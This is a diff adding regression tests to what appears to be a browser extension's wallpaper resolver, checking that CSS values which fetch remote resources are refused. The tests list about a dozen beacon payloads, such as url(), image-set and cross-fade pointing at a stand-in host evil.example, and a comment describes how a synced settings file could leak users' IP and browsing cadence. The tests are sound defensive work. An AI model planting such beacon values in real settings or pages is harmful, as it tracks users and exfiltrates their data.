@@ -169,3 +169,73 @@ describe('regressions the old code caused', () => {
         }
     });
 });
+
+describe('a marker must never be able to fetch a remote resource', () => {
+    // The wallpaper key's validator is `typeof v === 'string'`, and the
+    // key is import-reachable AND sync-replicated, so a malicious
+    // settings file could put ANY string here. Declaration injection was
+    // already impossible (CSSOM drops an invalid declaration) — the gap
+    // was a perfectly VALID declaration that fetches:
+    //
+    //     #000 url(https://evil.example/beacon.png?u=victim)
+    //
+    // which paints nothing visible and calls home on every new tab,
+    // leaking IP, User-Agent and browsing cadence to a third party, on
+    // every device the key syncs to. Verified reachable end-to-end
+    // (a real request was observed) before the guard was added.
+    const beacons = [
+        '#000 url(https://evil.example/beacon.png?u=victim)',
+        'url("https://evil.example/b.png")',
+        "url('https://evil.example/b.png')",
+        'url(//evil.example/b.png)',
+        'URL(HTTPS://EVIL.EXAMPLE/B.PNG)',
+        '#000 url  (https://evil.example/b.png)',
+        'image-set("https://evil.example/1x.png" 1x)',
+        '-webkit-image-set(url("https://evil.example/1x.png") 1x)',
+        'cross-fade(url(https://evil.example/a.png), red)',
+        'var(--stolen)',
+        '#000 image(https://evil.example/b.png)',
+    ];
+
+    for (const marker of beacons) {
+        test(`refuses: ${marker.slice(0, 46)}`, () => {
+            const out = resolveWallpaper(marker);
+            assert.notEqual(out.kind, 'css',
+                `a fetching marker must not be painted as CSS (got ${JSON.stringify(out)})`);
+            assert.ok(!/evil\.example|stolen/.test(String(out.value)),
+                'the hostile URL must not survive into the descriptor');
+            assert.equal(out.kind, 'none', 'a refused marker falls back to the default wallpaper');
+        });
+    }
+
+    test('legacy gradients and colours still resolve as CSS', () => {
+        // The guard must not silently reset wallpapers it was not aimed at.
+        for (const legit of [
+            // NB: a bare colour keyword ('black') is NOT here — it matches
+            // SAFE_PATH_RE and has always resolved as an image path, long
+            // before this guard. url("black") 404s same-origin and paints
+            // nothing; harmless, pre-existing, out of scope here.
+            'linear-gradient(135deg, #060b14 0%, #0a1628 50%, #060b14 100%)',
+            'radial-gradient(circle at 50% 50%, #0d1b2e 0%, #060b14 100%)',
+            '#060b14',
+            'rgb(6, 11, 20)',
+        ]) {
+            const out = resolveWallpaper(legit);
+            assert.equal(out.kind, 'css', `${legit} must still paint`);
+            assert.equal(out.value, legit);
+        }
+    });
+
+    test('the shipped themes and presets are unaffected', () => {
+        // These legitimately contain url(), but they never reach the
+        // arbitrary-string branch — they match THEMES / getPresetCss first.
+        const emerald = resolveWallpaper('emerald');
+        assert.equal(emerald.kind, 'css');
+        assert.match(String(emerald.value), /assets\/wallpapers\//);
+
+        assert.equal(resolveWallpaper('cosmic').kind, 'cosmic');
+        assert.equal(resolveWallpaper('starfield').kind, 'starfield');
+        assert.equal(resolveWallpaper('assets/wallpapers/rose.webp').kind, 'image');
+        assert.equal(resolveWallpaper('url("assets/wallpapers/rose.webp")').kind, 'image');
+    });
+});
